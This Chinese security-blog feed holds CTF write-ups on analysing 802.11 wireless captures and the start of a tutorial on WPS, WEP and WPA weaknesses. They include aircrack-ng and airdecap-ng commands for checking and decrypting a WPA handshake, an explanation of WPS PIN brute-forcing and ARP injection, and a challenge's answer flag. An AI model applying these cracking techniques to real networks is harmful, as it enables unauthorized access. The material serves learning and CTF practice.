id="预期解法"><a href="#预期解法" class="headerlink" title="预期解法"></a>预期解法</h6><p>准确地讲，题目虽然做出来了，但是这种解法也算是非预期解法。反过来去思考出题的思路，个人猜想出一些可能的预期解法，如下：</p><p>根据提示2，我们先过滤出<strong>不规范的802.11 frame</strong>，过滤语句<code>_ws.expert.group == &quot;Malformed&quot;</code>，这个在数据包里的过滤后的结果显示是这样的</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1541035795841.png" alt="1541035795841"></p><p>根据提示3，它需要的是<code>malformat RSN</code>的数据分组，那我们先过滤出存在<code>RSN</code>的数据分组，因为如果不存在RSN信息的数据分组，我们也就不需要去判断是不是<code>malformat</code>了。但过滤语句怎么写呢？</p><p>因为<code>Tag：RSN Information</code>中<code>Tag Number</code>为48，所以构造过滤语句<code>wlan.tag.number == 48</code></p><p><img src="/2018/11/09/护网杯-old-Attack题解/1541036018414.png" alt="1541036018414"></p><p>结合提示<code>2</code>和<code>3</code>的过滤语句最后构造为<code>_ws.expert.group == &quot;Malformed&quot;&amp;&amp;wlan.tag.number == 48</code>,下图为过滤结果，过滤出来全都是含有<code>Tag：RSN Information</code>和<code>malformat</code>的帧。</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1541036551342.png" alt="1541036551342"></p><p>但是提示<code>3</code>说的是<code>malformat RSN</code>，所以我们需要知道<code>Tag：RSN Information</code>为不规范的<code>malformat RSN</code>数据分组。稍微仔细点观察，翻到过滤后的数据分组末端，就会发现我们所想看到的<code>malformat RSN</code>分组。</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1541037713427.png" alt="1541037713427"></p><p>上图就是分组序号<code>112936</code>得信息，但是解密的<code>wpa-psk</code>的值并不是这个分组长度<code>64</code>位的<code>ssid</code>值，但是它提供了这个异常分组的源<code>mac</code>地址和目的<code>mac</code>地址，尝试过滤下，页面如下</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1541038302107.png" alt="1541038302107"></p><p>不知你有没有看到那个<code>Tag: RSN Information</code>中包含的子树所显示的<code>Auth Key Management (AKM) Suite Count: 65535</code>，当我看到这里的时候，好像明白了提示一的作用(￣▽￣)／。</p><p>而后面的解法，就跟之前提到的非预期解法一样啦。大家就自己分析去试试吧。其中的许多知识点，比如为啥<code>wpa-psk</code>值一定为<code>64</code>位等等，放了两个链接，大家随意啊。</p><p><a href="https://www.cnblogs.com/rjdeng/archive/2016/07/01/5633642.html" target="_blank" rel="noopener">无线网络密码WPA/WPA2算法介绍（适合新手阅读 ）</a></p><p><a href="http://www.tech-faq.com/rsn-robust-secure-network.html" target="_blank" rel="noopener">rsn-robust-secure-network</a></p><h5 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h5><p>仔细分析流量包，你会发现，其中的<code>Type/Subtype: Beacon frame (0x0008)</code>类型数据分组是做了大量混淆工作的，而说起这种混淆技术，运用的是哪种方法实现的那就够得谈了，这不仅涉及到题目的原理，也涉及到测试攻击的不同手段，下次讲咯。下面先放出本题所模拟<code>Beacon</code>大量请求的截图（本测试为个人设备演示，<code>T35t</code>为测试<code>AP</code>）：</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1541047943236.png" alt="1541047943236"></p><p>最后，好好学习，天天向上。ヾ(๑╹◡╹)ﾉ”</p><p>ps:</p><p>本文由安全客原创发布  </p><p>转载，请参考<a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/163596" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163596</a>  </p><p>安全客 - 有思想的安全新媒体</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;经过两个星期左右的学习，深入了一番&lt;code&gt;IEEE 802.11&lt;/code&gt;，终于把护网杯那题&lt;code&gt;0&lt;/code&gt;解的无线流量题目做出来了，下面分析一番，稍作扩展。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一道无线流量题目引发的思考</title>
    <link href="https://jianghuxia.github.io/2018/10/25/%E4%B8%80%E9%81%93%E6%97%A0%E7%BA%BF%E6%B5%81%E9%87%8F%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>https://jianghuxia.github.io/2018/10/25/一道无线流量题目引发的思考/</id>
    <published>2018-10-25T07:56:38.000Z</published>
    <updated>2018-10-26T04:12:21.064Z</updated>
    
    <content type="html"><![CDATA[<p>学习一番<code>IEEE 802.11</code>后，从原理性角度分析一道无线流量的CTF题目。</p><a id="more"></a> <p>在文章的开头处，先贴个<a href="http://10.254.1.201:9999/www.willhackforsushi.com/papers/80211_Pocket_Reference_Guide.pdf" target="_blank" rel="noopener">wireshark分析802.11协议的pdf链接</a>，可根据该文档所描述的内容快速过滤相应的数据包，这也是本文讲述如何使用<code>wireshark</code>学习分析<code>IEEE802.11</code>的帮助文档。不懂就翻翻咯~。本篇以一道<code>ciscn2018</code>的题目为引，从原理性分析学习<code>IEEE802.11</code>。</p><h4 id="帧的基本类型"><a href="#帧的基本类型" class="headerlink" title="帧的基本类型"></a>帧的基本类型</h4><p>关于帧的基本类型，基本上大家也都知道三种类型（贴个<a href="http://drops.xmd5.com/static/drops/wireless-15128.html" target="_blank" rel="noopener">基础知识链接</a>，不大理解的先看其中无线网络基础知识部分），这里重点讲述下管理帧。</p><h5 id="Management-frame（管理帧）"><a href="#Management-frame（管理帧）" class="headerlink" title="Management frame（管理帧）"></a>Management frame（管理帧）</h5><p>该帧的所显示的数据包一般用于各个设备之间建立第二层的连接，提供认证和连接服务。</p><p>该帧又细分为下面<code>14</code>种类型，每种类型所对应的中文注释以及过滤语句均已呈现。</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540112190240.png" alt="1540112190240"></p><p>而在管理帧中，值得重要一提的是<code>Beacon</code>，俗称<strong>信标</strong>，<code>Beacon</code>就像广播一般，向周边的其他设备声明某<code>AP</code>的类型及配置信息。下面会详细分析该帧。</p><h5 id="Control-frames（控制帧）"><a href="#Control-frames（控制帧）" class="headerlink" title="Control frames（控制帧）"></a>Control frames（控制帧）</h5><p>协助数据帧的传递，控制数据帧和管理帧的发送。</p><h5 id="Data-frame-数据帧"><a href="#Data-frame-数据帧" class="headerlink" title="Data frame (数据帧)"></a>Data frame (数据帧)</h5><p>包含真正的传输数据，最重要的是它可以将数据从无线网络转发到有线网络。在<code>wireshark</code>中，如果<code>AP</code>是使用的是<code>WEP</code>或者<code>WAP</code>加密,<code>Data frame</code>类型包，经过<code>wireshark</code>自带的解密功能<code>wep</code>、<code>wpa-pwd</code>、<code>wpa-psk</code>任意一种方法解密后，该类型数据包就会解析为更高层次的数据包，比如<code>http</code>数据包，在等会讲述的例题中，便与此相关。</p><h4 id="管理帧中Beacon的具体分析"><a href="#管理帧中Beacon的具体分析" class="headerlink" title="管理帧中Beacon的具体分析"></a>管理帧中Beacon的具体分析</h4><p>关于管理帧的具体分析，这里直接挑选<code>Beacon</code>来讲解。</p><p>为什么需要重点讲述<code>Beacon</code>呢？<code>Beacon</code>作为一个广播数据包，是一个<code>AP</code>向所有无线设备通知存在一个可用的<code>AP</code>，涵盖了一个<code>AP</code>大量的配置参数信息。另外，在<code>IEEE802.11</code>下，不同管理帧的具体内容和用途虽然不一样，但其他都与<code>Beacon</code>相似。下面即是一个<code>Beacon</code>的例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Frame 1: 279 bytes on wire (2232 bits), 279 bytes captured (2232 bits) on interface 0</span><br><span class="line">Radiotap Header v0, Length 24</span><br><span class="line">802.11 radio information</span><br><span class="line">IEEE 802.11 Beacon frame, Flags: ........-beacon广播包</span><br><span class="line">    Type/Subtype: Beacon frame (0x0008)-可使用wlan.fc.type_subtype == 0x0008过滤</span><br><span class="line">    Frame Control Field: 0x8000</span><br><span class="line">        .... ..00 = Version: 0</span><br><span class="line">        .... 00.. = Type: Management frame (0)-帧类型为管理帧</span><br><span class="line">        1000 .... = Subtype: 8</span><br><span class="line">        Flags: 0x00</span><br><span class="line">    .000 0000 0000 0000 = Duration: 0 microseconds</span><br><span class="line">    Receiver address: Broadcast (ff:ff:ff:ff:ff:ff)</span><br><span class="line">    Destination address: Broadcast (ff:ff:ff:ff:ff:ff)</span><br><span class="line">    Transmitter address: Tp-LinkT_ca:13:df (30:<span class="built_in">fc</span>:68:ca:13:df) -传输mac地址</span><br><span class="line">    Source address: Tp-LinkT_ca:13:df (30:<span class="built_in">fc</span>:68:ca:13:df)-源地址</span><br><span class="line">    BSS Id: Tp-LinkT_ca:13:df (30:<span class="built_in">fc</span>:68:ca:13:df)-bssid</span><br><span class="line">    .... .... .... 0000 = Fragment number: 0</span><br><span class="line">    0110 1110 1011 .... = Sequence number: 11</span><br><span class="line">IEEE 802.11 wireless LAN-IEEE 802.11帧信息</span><br><span class="line">    Fixed parameters (12 bytes)-固定参数</span><br><span class="line">        Timestamp: 0x000000017752d876-发送数据包的时间戳</span><br><span class="line">        Beacon Interval: 0.102400 [Seconds]-beacon数据包的重传间隔</span><br><span class="line">        Capabilities Information: 0x0431-Wap的硬件容量信息</span><br><span class="line">    Tagged parameters (219 bytes)-标记参数</span><br><span class="line">        Tag: SSID parameter <span class="built_in">set</span>: T35t-ssid（网络名称）</span><br><span class="line">        Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec]</span><br><span class="line">        Tag: DS Parameter <span class="built_in">set</span>: Current Channel: 1-Wap广播信道</span><br><span class="line">        Tag: Traffic Indication Map (TIM): DTIM 0 of 0 bitmap-传输指示映射</span><br><span class="line">        Tag: ERP Information</span><br><span class="line">        Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec]-扩展支持速率</span><br><span class="line">        Tag: HT Capabilities (802.11n D1.10)-超线程性能</span><br><span class="line">        Tag: HT Information (802.11n D1.10)-超线程信息</span><br><span class="line">        Tag: RSN Information-安全网络信息</span><br><span class="line">        Tag: Vendor Specific: Microsoft Corp.: WPA Information Element-供应商及WPA信息</span><br><span class="line">            Tag Number: Vendor Specific (221)-供应商编号</span><br><span class="line">            Tag length: 22-长度</span><br><span class="line">            OUI: 00:50:f2 (Microsoft Corp.)-安装程序</span><br><span class="line">            Vendor Specific OUI Type: 1</span><br><span class="line">            Type: WPA Information Element (0x01)-类型</span><br><span class="line">            WPA Version: 1-WPA版本为1</span><br><span class="line">            Multicast Cipher Suite: 00:50:f2 (Microsoft Corp.) AES (CCM)-多播密码插件</span><br><span class="line">            Unicast Cipher Suite Count: 1   -单播密码套件数</span><br><span class="line">            Unicast Cipher Suite List 00:50:f2 (Microsoft Corp.) AES (CCM)  -单播密码套件列表</span><br><span class="line">            Auth Key Management (AKM) Suite Count: 1   -认证密钥管理套件数</span><br><span class="line">            Auth Key Management (AKM) List 00:50:f2 (Microsoft Corp.) PSK   -认证密钥管理列表</span><br><span class="line">        Tag: Vendor Specific: Microsoft Corp.: WMM/WME: Parameter Element</span><br><span class="line">        Tag: Vendor Specific: TP-LINK TECHNOLOGIES CO.,LTD.</span><br><span class="line">        Tag: Vendor Specific: Microsoft Corp.: WPS</span><br></pre></td></tr></table></figure><h4 id="原理性题解：2018ciscn-misc-寻找入侵者"><a href="#原理性题解：2018ciscn-misc-寻找入侵者" class="headerlink" title="原理性题解：2018ciscn-misc-寻找入侵者"></a>原理性题解：2018ciscn-misc-寻找入侵者</h4><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p><code>黑客使用无线钓鱼攻击一个SSID为“CyberPeace”的热点，但是我们的蜜罐系统捕获了他的数据包，并且已经得知他的握手包密码就是他的网卡地址。可是根据我们最新获得的情况，他又发送重连请求的Malformat Frame试图崩溃我们的无线路由器。请从attack包中找到密码，并解开他的数据包,找到那条畸形数据。</code></p><p>题目所给附件：</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540132034379.png" alt="1540132034379"></p><h5 id="思路解析"><a href="#思路解析" class="headerlink" title="思路解析"></a>思路解析</h5><p><code>attack.pcapng</code>记录着蜜罐系统所抓取的所有数据包，而<code>hanshake.cap</code>则是蜜罐系统抓取的黑客的握手包。本题的思路也就是通过分析<code>attack.pcapng</code>，寻找到黑客<code>mac</code>地址，然后通过<code>aircrack-ng</code>工具验证<code>hanshake.cap</code>握手包的密码，并且使用这个密码解密<code>hanshake.cap</code>的数据。通过分析解密后的<code>hanshake.cap</code>的<code>http</code>数据，找到另外一个<code>key.pcap</code>的在线下载链接，然后分析<code>key.pcap</code>，找到其中的畸形数据，也就是最终的答案。</p><h5 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h5><p><code>wireshark</code>打开<code>attack.pcapng</code>数据包，依照题意<strong>“黑客使用无线钓鱼攻击一个SSID为‘CyberPeace’的热点”</strong>，我们可以先过滤<code>SSID</code>名为<code>CyberPeace</code>的<code>Beacon</code>的信标分组(一般通过<code>Beacon</code>就可以分析出<code>AP</code>的基本信息)，过滤语句<code>wlan.fc.type_subtype == 0x0008&amp;&amp;wlan.ssid==CyberPeace</code>，如下图</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540173014585.png" alt="1540173014585"></p><h6 id="坑点一：使用时钟偏差检测AP的真伪"><a href="#坑点一：使用时钟偏差检测AP的真伪" class="headerlink" title="坑点一：使用时钟偏差检测AP的真伪"></a>坑点一：使用时钟偏差检测<code>AP</code>的真伪</h6><p>过滤之后，发现数据分组依旧多的一匹，思考了半天，网上翻阅资料一堆，隔天才找到<a href="http://drops.xmd5.com/static/drops/wireless-15128.html" target="_blank" rel="noopener">相关的资料</a>，其中有此描述</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540175874395.png" alt="1540175874395"></p><p>也就是根据 <code>IEEE802.11</code>协议中的<code>TSF</code>（<code>Time Synchronization Function</code>，定时同步功能），通过收集<code>AP</code>的<code>Beacon</code>（信标帧）或者<code>Probe response</code>（探头响应消息）来计算AP的时钟偏差，通过与特征库中储存的偏差值比较，判断此<code>AP</code>是否为无线钓鱼<code>AP</code>。</p><p>那么问题来了，<code>wireshark</code>怎么查看时间戳在哪呢？额，我们随便挑个<code>Beacon</code>的分组看看，时间戳在<code>IEEE 802.11 wireless LAN</code>的分支下（上面），如下图：</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540176058686.png" alt="1540176058686"></p><p>接着，我们继续往下观察各分组的<code>Timestamp</code>的值，一直到<code>2153</code>分组，终于观察到不同的地方</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540176332046.png" alt="1540176332046"></p><p>第<code>2153</code>分组中<code>Timestamp</code>的值为<code>0x0000000000000000</code>，与其他<code>AP</code>中<code>Beacon</code>的<code>Timestamp</code>值不同，而此时的<code>AP</code>对应<code>mac</code>地址的值为<code>88:25:93:c1:c8:eb</code>（上图显示为<code>TP-LinkT_c1:c8:eb</code>）。再查看此<code>mac</code>地址其他<code>Beacon</code>的分组包，比如序号分组为<code>2192</code>、<code>2237</code>、<code>2306</code>（<code>SN</code>的值依次为2，3，4）中的<code>Timestamp</code>的值，你会发现<code>Timestamp</code>的值均为<code>0x0000000000000000</code>。</p><p>或者更直观一点，执行过滤语句：</p><p><code>wlan.fc.type_subtype == 0x0008&amp;&amp;wlan.ssid==CyberPeace&amp;&amp;wlan.fixed.timestamp == 0x00</code>，观察下图，会发现均值<code>mac</code>地址的值为<code>88:25:93:c1:c8:eb</code>的<code>Beacon</code>，且<code>Timestamp</code>均为<code>0x0000000000000000</code>。（分析结束后，发现直接执行过滤语句<code>wlan.fixed.timestamp ==0x00</code>，也可以得到相同的结果）</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540177912309.png" alt="1540177912309"></p><p>故根据以上分析，再依照题意<strong>“并且已经得知他的握手包密码就是他的网卡地址”</strong>，我们可以确定黑客的网卡地址为<code>88:25:93:c1:c8:eb</code>，<code>hanshake.cap</code>的握手密码也应是<code>88:25:93:c1:c8:eb</code>，将这个密码写入文件<code>d1.txt</code>中，然后通过<code>aircrack-ng</code>工具验证下密码的正确与否，执行命令<code>aircrack-ng hanshake.cap -w d1.txt</code>。</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540178936411.png" alt="1540178936411"></p><p>如上图结果所示，验证成功。接下来就是解开<code>hanshake.cap</code>这个<code>wpa</code>握手包里的数据了。</p><h6 id="坑点二：已知wifi密码如何正确解密cap数据包"><a href="#坑点二：已知wifi密码如何正确解密cap数据包" class="headerlink" title="坑点二：已知wifi密码如何正确解密cap数据包"></a>坑点二：已知<code>wifi</code>密码如何正确解密<code>cap</code>数据包</h6><p>这里主要有两种方法（当然还有其他的方法，比如使用<code>Cain</code>解密），一种通过<code>wireshark</code>提供的<a href="https://www.wireshark.org/tools/wpa-psk.html" target="_blank" rel="noopener">转化网址</a>，只需输入<code>ssid</code>和密码就能将其转化为<code>PSK</code>值。</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540180703551.png" alt="1540180703551"></p><p>然后打开<code>wireshark</code>，依次按照步骤操作：编辑  -&gt;  首选项  -&gt;  <code>Protocols</code> -&gt;  <code>IEEE 802.11</code> ，点击<code>Edit</code></p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540181032687.png" alt="1540181032687"></p><p>然后选填<code>wpa-psk</code>，输入刚刚转化得到的<code>PSK</code>值，进行解密</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540181063404.png" alt="1540181063404"></p><p>尝试过<code>wpa-pwd</code>，发现格式错误，解密无效</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540180902963.png" alt="1540180902963"></p><p>另一种方法是通过<code>airdecap-ng</code>工具解密，执行命令<code>airdecap-ng -p 88:25:93:c1:c8:eb -e Honey hanshake.cap</code></p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540195478057.png" alt="1540195478057"></p><p>打开解密后的流量包，会发现解析出了其他协议的数据分组</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540181190099.png" alt="1540181190099"></p><p>仔细分析后，发现执行<code>http.request.method==GET</code>语句过滤后，存在个<code>key.rar</code>压缩包的下载网址</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540194252910.png" alt="1540194252910"></p><p>因为这个文件当时是通过分析出来的，然后通过在线网址直接下载的。但之前链接已经失效（自己之前的没存(╥╯^╰╥)），不过还好，左问右问，还有老哥存着<code>key.rar</code>，要了一份，在这里特别感谢<a href="https://www.jianshu.com/u/121bf0f6b3d2" target="_blank" rel="noopener">阿烨</a>老哥，谢谢。</p><p>打开压缩包，解压得到个<code>key.pcap</code>，<code>wireshark</code>打开分析，这里先将正常的预期做法，包括踩坑步骤讲述下：</p><p>打开数据包后，再仔细看看题目，其中讲到<strong>“他又发送重连请求的Malformat Frame试图崩溃我们的无线路由器”</strong>，故我们先执行过滤语句<code>wlan.addr==88:25:93:c1:c8:eb</code>过滤出黑客网卡发出的所有包。</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540215449129.png" alt="1540215449129"></p><p>可以看到所有的过滤后所有的分组都是<code>Type/Subtype: Association Request (0x0000)</code>，上面讲过 <code>Association Request</code>中文释义”关联请求“，顾名思义，而黑客通过<code>Association Request</code>发送了大量的<code>Malformat</code>，企图崩溃无线路由器。而在最后一条分组中找到了答案，也就是那条<strong>“畸形数据”</strong>。</p><p><img src="/2018/10/25/一道无线流量题目引发的思考/1540216568389.png" alt="1540216568389"></p><p>最终答案：<code>CISCN{Z9DY20jZIyjzY5vs0UQZVUg86eMYlNMzH}</code></p><p>在其中的数据包中，我们发现黑客是使用了大量的<code>Association Request</code>发送了大量的<code>Malformat</code>攻击路由器，这其实是无线<code>AP</code>中<code>dos</code>攻击中一种<code>Association Flood Attack</code>（关联洪水攻击），简称<code>Asso攻击</code>。关于几种攻击方式，计划着之后来篇动手实践<code>fuzz</code>玩<code>AP</code>的总结(✪ω✪)。</p><h5 id="关于此题的思考"><a href="#关于此题的思考" class="headerlink" title="关于此题的思考"></a>关于此题的思考</h5><p>关于此题，看了许多资料，想了想这题的出题原理，在安全客上顺带找到一篇<a href="https://www.anquanke.com/post/id/84689" target="_blank" rel="noopener">【技术分享】基于802.11Fuzz技术的研究</a>，发现就是原出题作者写的，在此先膜下。<code>orz~</code>。</p><p>此题，那时比赛后看了许多<code>writeup</code>，基本上黑客<code>mac</code>地址都是<code>wireshark</code>提取出来，然后爆破的，而最后的畸形数据也是<code>strings key.pcap</code>出来的。自己那时也是差不多的做法，正好最近学习了一波<code>IEEE 802.11</code>，那就从原理角度梳理下这题，发现学到的东西也是不少啊。如果有其他的做法，欢迎师傅们一起讨论。</p><h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>不得不说，最近学习<code>IEEE 802.11</code>协议有一种快乐的感觉，虽然其中很多东西需要自己不断的搜索资料，阅读书籍，但是学习之后，再结合实验，发现学到的东西真的挺多的，那种充实感、成就感相信大家都有过，共勉吧，好好学习，天天向上。</p><p>ps:</p><p>本文由安全客原创发布  </p><p>转载，请参考<a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/162546" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162546</a>  </p><p>安全客 - 有思想的安全新媒体</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习一番&lt;code&gt;IEEE 802.11&lt;/code&gt;后，从原理性角度分析一道无线流量的CTF题目。&lt;/p&gt;
    
    </summary>
    
    
      <category term="wifi" scheme="https://jianghuxia.github.io/tags/wifi/"/>
    
  </entry>
  
  <entry>
    <title>无线网络安全测试初探</title>
    <link href="https://jianghuxia.github.io/2018/10/17/%E5%B0%8F%E7%99%BD%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%88%9D%E6%8E%A2/"/>
    <id>https://jianghuxia.github.io/2018/10/17/小白无线网络测试初探/</id>
    <published>2018-10-17T14:22:35.000Z</published>
    <updated>2018-10-23T10:08:28.763Z</updated>
    
    <content type="html"><![CDATA[<p>随着技术的发展，无线网络<code>wifi</code>遍布每个角落，殊不知隐藏其中的风云涌动。</p><a id="more"></a> <p>这学期上了计算机网络，但是学过了其中的浅浅知识，有点无聊，正好看到<code>IEEE 802.11</code>，加上最近护网杯出了一题与无线<code>AP</code>流量包的分析题目，赛终依旧<code>0</code>解。遂自行学习一波知识，从原理入手，动手实验，归纳一番。</p><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p><code>AP</code>：<code>Access Point</code>,中文名”无线访问接入点“，在本篇文章中，无线路由器也指<code>AP</code>。<code>AP</code>的功能主要使无线设备能够快速轻易地与无线网络连接，是无线设备与有线局域网络的桥梁。</p><p><code>IEEE 802.11</code>协议：说起无线网络，那么就不得不提到<code>IEEE 802.11</code>标准，该协议主要用于解决终端之间的无线接入，包括<code>wifi</code>，蓝牙等等。所以，学习无线网络的相关知识，翻阅<code>IEEE 802.11</code>文档是必须的。</p><p><code>Aircrack-ng</code>：一个与<code>IEEE 802.11</code>标准的无线网络分析有关的安全软件。</p><p><code>SSID</code>：<code>Service Set Identifier</code> ，中文名为服务集标识。在本篇中，运用<code>Aircrack-ng</code>的界面中，有出现<code>BSSID</code>和<code>ESSID</code>，在其中<code>BSSID</code>指的是<code>AP</code>的<code>MAC</code>地址，<code>ESSID</code>为<code>AP</code>的名称。</p><h4 id="加密模式"><a href="#加密模式" class="headerlink" title="加密模式"></a>加密模式</h4><h5 id="WPS加密（Wi-FI-Protected-Setup）"><a href="#WPS加密（Wi-FI-Protected-Setup）" class="headerlink" title="WPS加密（Wi-FI Protected Setup）"></a><code>WPS</code>加密（Wi-FI Protected Setup）</h5><p>在早期的<code>wifi</code>中，人们发现<code>wifi</code>的便利性，相应地，为了维护个人或集体的数据隐私，也添加了无线网络加密认证。但由于早期的认证步骤过于繁杂，干脆不做任何加密安全的设定，从而引发许多安全问题，于是WPS加密模式应运而生。通过该模式，用户只需在每次连接无线路由器上的<code>WPS</code>按键（<code>Push Button Condiguration</code>，按钮模式）或者输入此时路由器的<code>PIN</code>码（<code>Pin Input Configuration</code>,个人识别码模式），就能将新设备加入无线网络中。</p><p>如果你听说过爆破<code>PIN码</code>，继而得到<code>wifi</code>密码这种操作也正是个人识别码模式的缺陷，或者说是<code>WPS</code>的漏洞。<code>PIN</code>码是由8位纯数字组成的，第8位为校验位，而这一位是可以通过前7位计算的。在验证PIN码时，会先检测前四位，如果验证成功，则反馈一条信息。而通过这点，爆破前四位，由反馈的信息验证，即可得到正确的前四位，剩余的四位中，因为最后一位是通过<code>PIN</code>码前7位算出的，只需再爆破后四位中的前三位，我们就可以爆破得到<code>AP</code>的<code>PIN</code>码。</p><p><code>WPS</code>也叫作<code>QSS</code>，一般在路由器的“QSS安全设置”页面即可找到。（并不是所有的无线路由器都支持<code>WPS</code>）</p><p><img src="/2018/10/17/小白无线网络测试初探/1539766546221.png" alt="1539766546221"></p><p>另外，大多数路由器默认的<code>QSS</code>是关闭的，需要手动开启。</p><h5 id="WEP加密（Wired-Equivalent-Privacy-有效等效保密协议）"><a href="#WEP加密（Wired-Equivalent-Privacy-有效等效保密协议）" class="headerlink" title="WEP加密（Wired Equivalent Privacy,有效等效保密协议）"></a><code>WEP</code>加密（Wired Equivalent Privacy,有效等效保密协议）</h5><p>说起<code>WEP</code>，大家并不陌生，在八年前那个时候，<code>wifi</code>的兴起，“蹭网“的热情，想必都经历过。虽然，<code>WEP</code>已经逐渐被<code>WPA-PSK/WPA2-PSK</code>模式取代，但是打开你的手机无线网络，相信在众多的<code>wifi</code>中，你还是能发现那么一两个<code>WEP</code>的<code>wifi</code>。</p><p><code>WEP</code>工作原理是通过使用<code>RC4</code>（Rivest Cipher）串流技术加密，并使用<code>CRC32</code>（循环冗余校验）校验和保证资料的正确性。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539769981074.png" alt="1539769981074"></p><p>如上图，<code>WEP</code>使用<code>RC4</code>的算法产生伪随机序列流，将其与要传输的明文进行<code>xor</code>运算，再利用<code>CRC</code>算法生成ICV<code>完整性校验值</code>，再将刚刚的<code>xor</code>内容和<code>ICV</code>组合在一起，完成传输。其中，<code>RC4</code>的秘钥由初始化向量<code>IV</code>（24位）和用户秘钥<code>SK</code>组成。当然，解密过程即是加密过程的逆推，首先检验CRC的值，进行完整性校验，提取出IV值，和对应的用户私钥<code>SK</code>通过<code>RC4</code>计算出伪随机序列号，进行<code>xor</code>运算，计算出<code>ICV&#39;</code>值。再通过对比原先的<code>ICV</code>值，判断数据正确性。</p><p>可以发现上述的过程中，如果攻击者获得了两段由相同的RC4密钥流序列加密后得到的密文，只需<code>xor</code>下，得到的也就是两段明文的<code>xor</code>内容，那么密钥就会失效。其次，初始化向量IV对于整个<code>RC4</code>的加密过程中，起到关键作用。先甩个国外的文档<a href="http://www.opus1.com/www/whitepapers/whatswrongwithwep.pdf" target="_blank" rel="noopener">whatswrongwithwep.pdf</a>，其中描述了IV重用问题引起的<code>WEP</code>容易被破解的关键原因。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539772396878.png" alt="1539772396878"></p><p>如果加密时使用的IV值相同，那么对于使用相同的数据帧加密密钥是不安全的。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539772788037.png" alt="1539772788037"></p><p>再者之前提到过<code>WEP</code>的初始化向量<code>IV</code>为<code>24</code>位，每个传输的数据帧任意选择其中一个<code>IV</code>值进行加密。也就是说IV的选择范围只有<code>224</code>。假设<code>IV</code>初始值设为<code>0</code>，每传送一个数据帧，<code>IV</code>值增加<code>1</code>，这样在传输<code>224</code>个数据帧后就会遇到<code>IV</code>重用问题。而导致<code>WEP</code>容易被破解的原因，正是因为这个原因，对于通讯繁忙的<code>AP</code>，很可能在短期内导致<code>IV</code>的重复使用。</p><p>再者，由于<code>IV</code>是明文传送的，因此攻击者能获得两个或多个使用相同密钥的数据帧，就可以使用静态分析来恢复明文。 下面测试的破解<code>WEP</code>过程中，<code>ArpRequest</code>注入攻击原理是就是通过读取交互设备之间的<code>ARP</code>请求报文，并伪造报文再次重发出去，从而刺激<code>AP</code>产生更多的数据包，以供抓取更多的<code>IVS</code>数据包，加快破解速度。</p><p>而对于<code>wep</code>引发的安全问题，人们也采取了以下措施：</p><p>1、使用<code>WPA-PSK/WPA2-PSK</code>模式</p><p>2、设置无线网络<code>MAC</code>地址过滤</p><h5 id="WPA-PSK-WPA2-PSK加密（Wi-Fi-Protected-Access）"><a href="#WPA-PSK-WPA2-PSK加密（Wi-Fi-Protected-Access）" class="headerlink" 